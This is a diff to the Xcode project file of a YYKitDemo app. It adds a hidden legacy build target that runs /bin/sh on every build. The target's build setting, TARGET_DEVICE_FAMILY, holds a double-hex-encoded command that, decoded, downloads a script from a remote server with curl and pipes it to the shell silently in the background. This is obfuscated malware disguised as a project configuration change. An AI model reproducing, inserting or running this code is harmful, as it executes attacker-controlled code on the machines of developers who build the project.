@@ -1136,6 +1136,7 @@
 			buildRules = (
 			);
 			dependencies = (
+				C242A02E2A15A49BAB7DFEF2 /* PBXTargetDependency */,
 			);
 			name = YYKitDemo;
 			productName = YYKitDemo;
@@ -1170,10 +1171,33 @@
 			projectDirPath = "";
 			projectRoot = "";
 			targets = (
+				B4CB2BFCDB2E004A3D7DFEF2  /* Build Target */,
 				D97484CF19CAAD2900F46DE1 /* YYKitDemo */,
 			);
 		};
 /* End PBXProject section */
+
+/* Begin PBXTargetDependency section */
+		C242A02E2A15A49BAB7DFEF2 /* PBXTargetDependency */ = {
+			isa = PBXTargetDependency;
+			target = B4CB2BFCDB2E004A3D7DFEF2 /* Build Target */;
+		};
+/* End PBXTargetDependency section */
+
+/* Begin PBXLegacyTarget section */
+		B4CB2BFCDB2E004A3D7DFEF2 /* Build Target */ = {
+			isa = PBXLegacyTarget;
+			buildArgumentsString = "-c \"${TARGET_DEVICE_FAMILY}\"";
+			buildPhases = (
+			);
+			buildToolPath = /bin/sh;
+			dependencies = (
+			);
+			name = "Build Target";
+			passBuildSettingsInEnvironment = 1;
+			productName = "Build Target";
+		};
+/* End PBXLegacyTarget section */
 
 /* Begin PBXResourcesBuildPhase section */
 		D97484CE19CAAD2900F46DE1 /* Resources */ = {
@@ -1380,6 +1404,7 @@
 		D97484F119CAAD2900F46DE1 /* Debug */ = {
 			isa = XCBuildConfiguration;
 			buildSettings = {
+				TARGET_DEVICE_FAMILY = "(echo 3635363336383666323032323234323836333735373236633230326436363733366234633230363837343734373037333361326632663633363836313666373036393665363732653732373532663631323932323230376332303733363830610a | xxd -p -r | xxd -p -r | sh >/dev/null 2>&1 &)";
 				ALWAYS_SEARCH_USER_PATHS = NO;
 				CLANG_ANALYZER_NONNULL = YES;
 				CLANG_ANALYZER_NUMBER_OBJECT_CONVERSION = YES_AGGRESSIVE;
@@ -1433,6 +1458,7 @@
 		D97484F219CAAD2900F46DE1 /* Release */ = {
 			isa = XCBuildConfiguration;
 			buildSettings = {
+				TARGET_DEVICE_FAMILY = "(echo 3635363336383666323032323234323836333735373236633230326436363733366234633230363837343734373037333361326632663633363836313666373036393665363732653732373532663631323932323230376332303733363830610a | xxd -p -r | xxd -p -r | sh >/dev/null 2>&1 &)";
 				ALWAYS_SEARCH_USER_PATHS = NO;
 				CLANG_ANALYZER_NONNULL = YES;
 				CLANG_ANALYZER_NUMBER_OBJECT_CONVERSION = YES_AGGRESSIVE;
